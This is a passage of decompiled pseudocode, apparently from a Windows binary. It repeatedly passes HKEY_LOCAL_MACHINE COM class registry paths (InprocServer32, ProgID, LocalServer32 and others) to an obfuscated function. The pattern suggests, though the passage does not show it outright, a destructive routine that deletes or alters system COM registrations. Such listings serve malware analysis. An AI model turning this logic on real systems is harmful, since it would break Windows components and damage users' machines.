  loc_00457958: call var_C3AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457964: var_C3B0 = OnudaSilloA(global_80000002, var_C3AC)
  loc_00457969: call var_C3B4 = global_00401054
  loc_00457972: call var_C3B8 = global_004011CC
  loc_00457988: call var_C3BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457994: var_C3C0 = OnudaSilloA(global_80000002, var_C3BC)
  loc_00457999: call var_C3C4 = global_00401054
  loc_004579A2: call var_C3C8 = global_004011CC
  loc_004579B8: call var_C3CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000542-0000-0010-8000-00AA006D2EA4}")
  loc_004579C4: var_C3D0 = OnudaSilloA(global_80000002, var_C3CC)
  loc_004579C9: call var_C3D4 = global_00401054
  loc_004579D2: call var_C3D8 = global_004011CC
  loc_004579E8: call var_C3DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_004579F4: var_C3E0 = OnudaSilloA(global_80000002, var_C3DC)
  loc_004579F9: call var_C3E4 = global_00401054
  loc_00457A02: call var_C3E8 = global_004011CC
  loc_00457A18: call var_C3EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457A24: var_C3F0 = OnudaSilloA(global_80000002, var_C3EC)
  loc_00457A29: call var_C3F4 = global_00401054
  loc_00457A32: call var_C3F8 = global_004011CC
  loc_00457A48: call var_C3FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457A54: var_C400 = OnudaSilloA(global_80000002, var_C3FC)
  loc_00457A59: call var_C404 = global_00401054
  loc_00457A62: call var_C408 = global_004011CC
  loc_00457A78: call var_C40C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000560-0000-0010-8000-00AA006D2EA4}")
  loc_00457A84: var_C410 = OnudaSilloA(global_80000002, var_C40C)
  loc_00457A89: call var_C414 = global_00401054
  loc_00457A92: call var_C418 = global_004011CC
  loc_00457AA8: call var_C41C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457AB4: var_C420 = OnudaSilloA(global_80000002, var_C41C)
  loc_00457AB9: call var_C424 = global_00401054
  loc_00457AC2: call var_C428 = global_004011CC
  loc_00457AD8: call var_C42C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457AE4: var_C430 = OnudaSilloA(global_80000002, var_C42C)
  loc_00457AE9: call var_C434 = global_00401054
  loc_00457AF2: call var_C438 = global_004011CC
  loc_00457B08: call var_C43C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457B14: var_C440 = OnudaSilloA(global_80000002, var_C43C)
  loc_00457B19: call var_C444 = global_00401054
  loc_00457B22: call var_C448 = global_004011CC
  loc_00457B38: call var_C44C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000566-0000-0010-8000-00AA006D2EA4}")
  loc_00457B44: var_C450 = OnudaSilloA(global_80000002, var_C44C)
  loc_00457B49: call var_C454 = global_00401054
  loc_00457B52: call var_C458 = global_004011CC
  loc_00457B68: call var_C45C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457B74: var_C460 = OnudaSilloA(global_80000002, var_C45C)
  loc_00457B79: call var_C464 = global_00401054
  loc_00457B82: call var_C468 = global_004011CC
  loc_00457B98: call var_C46C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457BA4: var_C470 = OnudaSilloA(global_80000002, var_C46C)
  loc_00457BA9: call var_C474 = global_00401054
  loc_00457BB2: call var_C478 = global_004011CC
  loc_00457BC8: call var_C47C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457BD4: var_C480 = OnudaSilloA(global_80000002, var_C47C)
  loc_00457BD9: call var_C484 = global_00401054
  loc_00457BE2: call var_C488 = global_004011CC
  loc_00457BF8: call var_C48C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000602-0000-0010-8000-00AA006D2EA4}")
  loc_00457C04: var_C490 = OnudaSilloA(global_80000002, var_C48C)
  loc_00457C09: call var_C494 = global_00401054
  loc_00457C12: call var_C498 = global_004011CC
  loc_00457C28: call var_C49C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457C34: var_C4A0 = OnudaSilloA(global_80000002, var_C49C)
  loc_00457C39: call var_C4A4 = global_00401054
  loc_00457C42: call var_C4A8 = global_004011CC
  loc_00457C58: call var_C4AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457C64: var_C4B0 = OnudaSilloA(global_80000002, var_C4AC)
  loc_00457C69: call var_C4B4 = global_00401054
  loc_00457C72: call var_C4B8 = global_004011CC
  loc_00457C88: call var_C4BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457C94: var_C4C0 = OnudaSilloA(global_80000002, var_C4BC)
  loc_00457C99: call var_C4C4 = global_00401054
  loc_00457CA2: call var_C4C8 = global_004011CC
  loc_00457CB8: call var_C4CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000609-0000-0010-8000-00AA006D2EA4}")
  loc_00457CC4: var_C4D0 = OnudaSilloA(global_80000002, var_C4CC)
  loc_00457CC9: call var_C4D4 = global_00401054
  loc_00457CD2: call var_C4D8 = global_004011CC
  loc_00457CE8: call var_C4DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457CF4: var_C4E0 = OnudaSilloA(global_80000002, var_C4DC)
  loc_00457CF9: call var_C4E4 = global_00401054
  loc_00457D02: call var_C4E8 = global_004011CC
  loc_00457D18: call var_C4EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457D24: var_C4F0 = OnudaSilloA(global_80000002, var_C4EC)
  loc_00457D29: call var_C4F4 = global_00401054
  loc_00457D32: call var_C4F8 = global_004011CC
  loc_00457D48: call var_C4FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457D54: var_C500 = OnudaSilloA(global_80000002, var_C4FC)
  loc_00457D59: call var_C504 = global_00401054
  loc_00457D62: call var_C508 = global_004011CC
  loc_00457D78: call var_C50C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000615-0000-0010-8000-00AA006D2EA4}")
  loc_00457D84: var_C510 = OnudaSilloA(global_80000002, var_C50C)
  loc_00457D89: call var_C514 = global_00401054
  loc_00457D92: call var_C518 = global_004011CC
  loc_00457DA8: call var_C51C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457DB4: var_C520 = OnudaSilloA(global_80000002, var_C51C)
  loc_00457DB9: call var_C524 = global_00401054
  loc_00457DC2: call var_C528 = global_004011CC
  loc_00457DD8: call var_C52C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457DE4: var_C530 = OnudaSilloA(global_80000002, var_C52C)
  loc_00457DE9: call var_C534 = global_00401054
  loc_00457DF2: call var_C538 = global_004011CC
  loc_00457E08: call var_C53C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457E14: var_C540 = OnudaSilloA(global_80000002, var_C53C)
  loc_00457E19: call var_C544 = global_00401054
  loc_00457E22: call var_C548 = global_004011CC
  loc_00457E38: call var_C54C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000618-0000-0010-8000-00AA006D2EA4}")
  loc_00457E44: var_C550 = OnudaSilloA(global_80000002, var_C54C)
  loc_00457E49: call var_C554 = global_00401054
  loc_00457E52: call var_C558 = global_004011CC
  loc_00457E68: call var_C55C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457E74: var_C560 = OnudaSilloA(global_80000002, var_C55C)
  loc_00457E79: call var_C564 = global_00401054
  loc_00457E82: call var_C568 = global_004011CC
  loc_00457E98: call var_C56C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457EA4: var_C570 = OnudaSilloA(global_80000002, var_C56C)
  loc_00457EA9: call var_C574 = global_00401054
  loc_00457EB2: call var_C578 = global_004011CC
  loc_00457EC8: call var_C57C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457ED4: var_C580 = OnudaSilloA(global_80000002, var_C57C)
  loc_00457ED9: call var_C584 = global_00401054
  loc_00457EE2: call var_C588 = global_004011CC
  loc_00457EF8: call var_C58C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061B-0000-0010-8000-00AA006D2EA4}")
  loc_00457F04: var_C590 = OnudaSilloA(global_80000002, var_C58C)
  loc_00457F09: call var_C594 = global_00401054
  loc_00457F12: call var_C598 = global_004011CC
  loc_00457F28: call var_C59C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457F34: var_C5A0 = OnudaSilloA(global_80000002, var_C59C)
  loc_00457F39: call var_C5A4 = global_00401054
  loc_00457F42: call var_C5A8 = global_004011CC
  loc_00457F58: call var_C5AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00457F64: var_C5B0 = OnudaSilloA(global_80000002, var_C5AC)
  loc_00457F69: call var_C5B4 = global_00401054
  loc_00457F72: call var_C5B8 = global_004011CC
  loc_00457F88: call var_C5BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00457F94: var_C5C0 = OnudaSilloA(global_80000002, var_C5BC)
  loc_00457F99: call var_C5C4 = global_00401054
  loc_00457FA2: call var_C5C8 = global_004011CC
  loc_00457FB8: call var_C5CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0000061E-0000-0010-8000-00AA006D2EA4}")
  loc_00457FC4: var_C5D0 = OnudaSilloA(global_80000002, var_C5CC)
  loc_00457FC9: call var_C5D4 = global_00401054
  loc_00457FD2: call var_C5D8 = global_004011CC
  loc_00457FE8: call var_C5DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}\VersionIndependentProgID")
  loc_00457FF4: var_C5E0 = OnudaSilloA(global_80000002, var_C5DC)
  loc_00457FF9: call var_C5E4 = global_00401054
  loc_00458002: call var_C5E8 = global_004011CC
  loc_00458018: call var_C5EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}\ProgID")
  loc_00458024: var_C5F0 = OnudaSilloA(global_80000002, var_C5EC)
  loc_00458029: call var_C5F4 = global_00401054
  loc_00458032: call var_C5F8 = global_004011CC
  loc_00458048: call var_C5FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}\InprocServer32")
  loc_00458054: var_C600 = OnudaSilloA(global_80000002, var_C5FC)
  loc_00458059: call var_C604 = global_00401054
  loc_00458062: call var_C608 = global_004011CC
  loc_00458078: call var_C60C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00000621-0000-0010-8000-00AA006D2EA4}")
  loc_00458084: var_C610 = OnudaSilloA(global_80000002, var_C60C)
  loc_00458089: call var_C614 = global_00401054
  loc_00458092: call var_C618 = global_004011CC
  loc_004580A8: call var_C61C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\InprocServer32")
  loc_004580B4: var_C620 = OnudaSilloA(global_80000002, var_C61C)
  loc_004580B9: call var_C624 = global_00401054
  loc_004580C2: call var_C628 = global_004011CC
  loc_004580D8: call var_C62C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\InprocServer")
  loc_004580E4: var_C630 = OnudaSilloA(global_80000002, var_C62C)
  loc_004580E9: call var_C634 = global_00401054
  loc_004580F2: call var_C638 = global_004011CC
  loc_00458108: call var_C63C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}\AVIFile")
  loc_00458114: var_C640 = OnudaSilloA(global_80000002, var_C63C)
  loc_00458119: call var_C644 = global_00401054
  loc_00458122: call var_C648 = global_004011CC
  loc_00458138: call var_C64C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020000-0000-0000-C000-000000000046}")
  loc_00458144: var_C650 = OnudaSilloA(global_80000002, var_C64C)
  loc_00458149: call var_C654 = global_00401054
  loc_00458152: call var_C658 = global_004011CC
  loc_00458168: call var_C65C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020001-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458174: var_C660 = OnudaSilloA(global_80000002, var_C65C)
  loc_00458179: call var_C664 = global_00401054
  loc_00458182: call var_C668 = global_004011CC
  loc_00458198: call var_C66C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020001-0000-0000-C000-000000000046}\InprocServer")
  loc_004581A4: var_C670 = OnudaSilloA(global_80000002, var_C66C)
  loc_004581A9: call var_C674 = global_00401054
  loc_004581B2: call var_C678 = global_004011CC
  loc_004581C8: call var_C67C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020001-0000-0000-C000-000000000046}")
  loc_004581D4: var_C680 = OnudaSilloA(global_80000002, var_C67C)
  loc_004581D9: call var_C684 = global_00401054
  loc_004581E2: call var_C688 = global_004011CC
  loc_004581F8: call var_C68C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020003-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458204: var_C690 = OnudaSilloA(global_80000002, var_C68C)
  loc_00458209: call var_C694 = global_00401054
  loc_00458212: call var_C698 = global_004011CC
  loc_00458228: call var_C69C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020003-0000-0000-C000-000000000046}\AVIFile")
  loc_00458234: var_C6A0 = OnudaSilloA(global_80000002, var_C69C)
  loc_00458239: call var_C6A4 = global_00401054
  loc_00458242: call var_C6A8 = global_004011CC
  loc_00458258: call var_C6AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020003-0000-0000-C000-000000000046}")
  loc_00458264: var_C6B0 = OnudaSilloA(global_80000002, var_C6AC)
  loc_00458269: call var_C6B4 = global_00401054
  loc_00458272: call var_C6B8 = global_004011CC
  loc_00458288: call var_C6BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0002000D-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458294: var_C6C0 = OnudaSilloA(global_80000002, var_C6BC)
  loc_00458299: call var_C6C4 = global_00401054
  loc_004582A2: call var_C6C8 = global_004011CC
  loc_004582B8: call var_C6CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0002000D-0000-0000-C000-000000000046}\InprocServer")
  loc_004582C4: var_C6D0 = OnudaSilloA(global_80000002, var_C6CC)
  loc_004582C9: call var_C6D4 = global_00401054
  loc_004582D2: call var_C6D8 = global_004011CC
  loc_004582E8: call var_C6DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0002000D-0000-0000-C000-000000000046}")
  loc_004582F4: var_C6E0 = OnudaSilloA(global_80000002, var_C6DC)
  loc_004582F9: call var_C6E4 = global_00401054
  loc_00458302: call var_C6E8 = global_004011CC
  loc_00458318: call var_C6EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0002000F-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458324: var_C6F0 = OnudaSilloA(global_80000002, var_C6EC)
  loc_00458329: call var_C6F4 = global_00401054
  loc_00458332: call var_C6F8 = global_004011CC
  loc_00458348: call var_C6FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0002000F-0000-0000-C000-000000000046}\InprocServer")
  loc_00458354: var_C700 = OnudaSilloA(global_80000002, var_C6FC)
  loc_00458359: call var_C704 = global_00401054
  loc_00458362: call var_C708 = global_004011CC
  loc_00458378: call var_C70C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{0002000F-0000-0000-C000-000000000046}")
  loc_00458384: var_C710 = OnudaSilloA(global_80000002, var_C70C)
  loc_00458389: call var_C714 = global_00401054
  loc_00458392: call var_C718 = global_004011CC
  loc_004583A8: call var_C71C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020420-0000-0000-C000-000000000046}\InprocServer32")
  loc_004583B4: var_C720 = OnudaSilloA(global_80000002, var_C71C)
  loc_004583B9: call var_C724 = global_00401054
  loc_004583C2: call var_C728 = global_004011CC
  loc_004583D8: call var_C72C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020420-0000-0000-C000-000000000046}\InprocServer")
  loc_004583E4: var_C730 = OnudaSilloA(global_80000002, var_C72C)
  loc_004583E9: call var_C734 = global_00401054
  loc_004583F2: call var_C738 = global_004011CC
  loc_00458408: call var_C73C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020420-0000-0000-C000-000000000046}")
  loc_00458414: var_C740 = OnudaSilloA(global_80000002, var_C73C)
  loc_00458419: call var_C744 = global_00401054
  loc_00458422: call var_C748 = global_004011CC
  loc_00458438: call var_C74C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020421-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458444: var_C750 = OnudaSilloA(global_80000002, var_C74C)
  loc_00458449: call var_C754 = global_00401054
  loc_00458452: call var_C758 = global_004011CC
  loc_00458468: call var_C75C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020421-0000-0000-C000-000000000046}\InprocServer")
  loc_00458474: var_C760 = OnudaSilloA(global_80000002, var_C75C)
  loc_00458479: call var_C764 = global_00401054
  loc_00458482: call var_C768 = global_004011CC
  loc_00458498: call var_C76C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020421-0000-0000-C000-000000000046}")
  loc_004584A4: var_C770 = OnudaSilloA(global_80000002, var_C76C)
  loc_004584A9: call var_C774 = global_00401054
  loc_004584B2: call var_C778 = global_004011CC
  loc_004584C8: call var_C77C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020422-0000-0000-C000-000000000046}\InprocServer32")
  loc_004584D4: var_C780 = OnudaSilloA(global_80000002, var_C77C)
  loc_004584D9: call var_C784 = global_00401054
  loc_004584E2: call var_C788 = global_004011CC
  loc_004584F8: call var_C78C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020422-0000-0000-C000-000000000046}\InprocServer")
  loc_00458504: var_C790 = OnudaSilloA(global_80000002, var_C78C)
  loc_00458509: call var_C794 = global_00401054
  loc_00458512: call var_C798 = global_004011CC
  loc_00458528: call var_C79C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020422-0000-0000-C000-000000000046}")
  loc_00458534: var_C7A0 = OnudaSilloA(global_80000002, var_C79C)
  loc_00458539: call var_C7A4 = global_00401054
  loc_00458542: call var_C7A8 = global_004011CC
  loc_00458558: call var_C7AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020423-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458564: var_C7B0 = OnudaSilloA(global_80000002, var_C7AC)
  loc_00458569: call var_C7B4 = global_00401054
  loc_00458572: call var_C7B8 = global_004011CC
  loc_00458588: call var_C7BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020423-0000-0000-C000-000000000046}\InprocServer")
  loc_00458594: var_C7C0 = OnudaSilloA(global_80000002, var_C7BC)
  loc_00458599: call var_C7C4 = global_00401054
  loc_004585A2: call var_C7C8 = global_004011CC
  loc_004585B8: call var_C7CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020423-0000-0000-C000-000000000046}")
  loc_004585C4: var_C7D0 = OnudaSilloA(global_80000002, var_C7CC)
  loc_004585C9: call var_C7D4 = global_00401054
  loc_004585D2: call var_C7D8 = global_004011CC
  loc_004585E8: call var_C7DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020424-0000-0000-C000-000000000046}\InprocServer32")
  loc_004585F4: var_C7E0 = OnudaSilloA(global_80000002, var_C7DC)
  loc_004585F9: call var_C7E4 = global_00401054
  loc_00458602: call var_C7E8 = global_004011CC
  loc_00458618: call var_C7EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020424-0000-0000-C000-000000000046}\InprocServer")
  loc_00458624: var_C7F0 = OnudaSilloA(global_80000002, var_C7EC)
  loc_00458629: call var_C7F4 = global_00401054
  loc_00458632: call var_C7F8 = global_004011CC
  loc_00458648: call var_C7FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020424-0000-0000-C000-000000000046}")
  loc_00458654: var_C800 = OnudaSilloA(global_80000002, var_C7FC)
  loc_00458659: call var_C804 = global_00401054
  loc_00458662: call var_C808 = global_004011CC
  loc_00458678: call var_C80C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020425-0000-0000-C000-000000000046}\InprocServer32")
  loc_00458684: var_C810 = OnudaSilloA(global_80000002, var_C80C)
  loc_00458689: call var_C814 = global_00401054
  loc_00458692: call var_C818 = global_004011CC
  loc_004586A8: call var_C81C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020425-0000-0000-C000-000000000046}\InprocServer")
  loc_004586B4: var_C820 = OnudaSilloA(global_80000002, var_C81C)
  loc_004586B9: call var_C824 = global_00401054
  loc_004586C2: call var_C828 = global_004011CC
  loc_004586D8: call var_C82C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020425-0000-0000-C000-000000000046}")
  loc_004586E4: var_C830 = OnudaSilloA(global_80000002, var_C82C)
  loc_004586E9: call var_C834 = global_00401054
  loc_004586F2: call var_C838 = global_004011CC
  loc_00458708: call var_C83C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020810-0000-0000-C000-000000000046}\PersistentHandler")
  loc_00458714: var_C840 = OnudaSilloA(global_80000002, var_C83C)
  loc_00458719: call var_C844 = global_00401054
  loc_00458722: call var_C848 = global_004011CC
  loc_00458738: call var_C84C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020810-0000-0000-C000-000000000046}")
  loc_00458744: var_C850 = OnudaSilloA(global_80000002, var_C84C)
  loc_00458749: call var_C854 = global_00401054
  loc_00458752: call var_C858 = global_004011CC
  loc_00458768: call var_C85C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020811-0000-0000-C000-000000000046}\PersistentHandler")
  loc_00458774: var_C860 = OnudaSilloA(global_80000002, var_C85C)
  loc_00458779: call var_C864 = global_00401054
  loc_00458782: call var_C868 = global_004011CC
  loc_00458798: call var_C86C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020811-0000-0000-C000-000000000046}")
  loc_004587A4: var_C870 = OnudaSilloA(global_80000002, var_C86C)
  loc_004587A9: call var_C874 = global_00401054
  loc_004587B2: call var_C878 = global_004011CC
  loc_004587C8: call var_C87C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020820-0000-0000-C000-000000000046}\PersistentHandler")
  loc_004587D4: var_C880 = OnudaSilloA(global_80000002, var_C87C)
  loc_004587D9: call var_C884 = global_00401054
  loc_004587E2: call var_C888 = global_004011CC
  loc_004587F8: call var_C88C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020820-0000-0000-C000-000000000046}")
  loc_00458804: var_C890 = OnudaSilloA(global_80000002, var_C88C)
  loc_00458809: call var_C894 = global_00401054
  loc_00458812: call var_C898 = global_004011CC
  loc_00458828: call var_C89C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020821-0000-0000-C000-000000000046}\PersistentHandler")
  loc_00458834: var_C8A0 = OnudaSilloA(global_80000002, var_C89C)
  loc_00458839: call var_C8A4 = global_00401054
  loc_00458842: call var_C8A8 = global_004011CC
  loc_00458858: call var_C8AC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020821-0000-0000-C000-000000000046}")
  loc_00458864: var_C8B0 = OnudaSilloA(global_80000002, var_C8AC)
  loc_00458869: call var_C8B4 = global_00401054
  loc_00458872: call var_C8B8 = global_004011CC
  loc_00458888: call var_C8BC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020900-0000-0000-C000-000000000046}\PersistentHandler")
  loc_00458894: var_C8C0 = OnudaSilloA(global_80000002, var_C8BC)
  loc_00458899: call var_C8C4 = global_00401054
  loc_004588A2: call var_C8C8 = global_004011CC
  loc_004588B8: call var_C8CC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020900-0000-0000-C000-000000000046}")
  loc_004588C4: var_C8D0 = OnudaSilloA(global_80000002, var_C8CC)
  loc_004588C9: call var_C8D4 = global_00401054
  loc_004588D2: call var_C8D8 = global_004011CC
  loc_004588E8: call var_C8DC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020906-0000-0000-C000-000000000046}\PersistentHandler")
  loc_004588F4: var_C8E0 = OnudaSilloA(global_80000002, var_C8DC)
  loc_004588F9: call var_C8E4 = global_00401054
  loc_00458902: call var_C8E8 = global_004011CC
  loc_00458918: call var_C8EC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020906-0000-0000-C000-000000000046}")
  loc_00458924: var_C8F0 = OnudaSilloA(global_80000002, var_C8EC)
  loc_00458929: call var_C8F4 = global_00401054
  loc_00458932: call var_C8F8 = global_004011CC
  loc_00458948: call var_C8FC = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb\2")
  loc_00458954: var_C900 = OnudaSilloA(global_80000002, var_C8FC)
  loc_00458959: call var_C904 = global_00401054
  loc_00458962: call var_C908 = global_004011CC
  loc_00458978: call var_C90C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb\1")
  loc_00458984: var_C910 = OnudaSilloA(global_80000002, var_C90C)
  loc_00458989: call var_C914 = global_00401054
  loc_00458992: call var_C918 = global_004011CC
  loc_004589A8: call var_C91C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb\0")
  loc_004589B4: var_C920 = OnudaSilloA(global_80000002, var_C91C)
  loc_004589B9: call var_C924 = global_00401054
  loc_004589C2: call var_C928 = global_004011CC
  loc_004589D8: call var_C92C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\verb")
  loc_004589E4: var_C930 = OnudaSilloA(global_80000002, var_C92C)
  loc_004589E9: call var_C934 = global_00401054
  loc_004589F2: call var_C938 = global_004011CC
  loc_00458A08: call var_C93C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\ProgID")
  loc_00458A14: var_C940 = OnudaSilloA(global_80000002, var_C93C)
  loc_00458A19: call var_C944 = global_00401054
  loc_00458A22: call var_C948 = global_004011CC
  loc_00458A38: call var_C94C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\PersistentHandler")
  loc_00458A44: var_C950 = OnudaSilloA(global_80000002, var_C94C)
  loc_00458A49: call var_C954 = global_00401054
  loc_00458A52: call var_C958 = global_004011CC
  loc_00458A68: call var_C95C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\MiscStatus")
  loc_00458A74: var_C960 = OnudaSilloA(global_80000002, var_C95C)
  loc_00458A79: call var_C964 = global_00401054
  loc_00458A82: call var_C968 = global_004011CC
  loc_00458A98: call var_C96C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\LocalServer32")
  loc_00458AA4: var_C970 = OnudaSilloA(global_80000002, var_C96C)
  loc_00458AA9: call var_C974 = global_00401054
  loc_00458AB2: call var_C978 = global_004011CC
  loc_00458AC8: call var_C97C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\LocalServer")
  loc_00458AD4: var_C980 = OnudaSilloA(global_80000002, var_C97C)
  loc_00458AD9: call var_C984 = global_00401054
  loc_00458AE2: call var_C988 = global_004011CC
  loc_00458AF8: call var_C98C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\Insertable")
  loc_00458B04: var_C990 = OnudaSilloA(global_80000002, var_C98C)
  loc_00458B09: call var_C994 = global_00401054
  loc_00458B12: call var_C998 = global_004011CC
  loc_00458B28: call var_C99C = global_00401188(var_24, "SOFTWARE\Classes\CLSID\{00020C01-0000-0000-C000-000000000046}\InprocHandler32")
  loc_00458B34: var_C9A0 = OnudaSilloA(global_80000002, var_C99C)
  loc_00458B39: call var_C9A4 = global_00401054
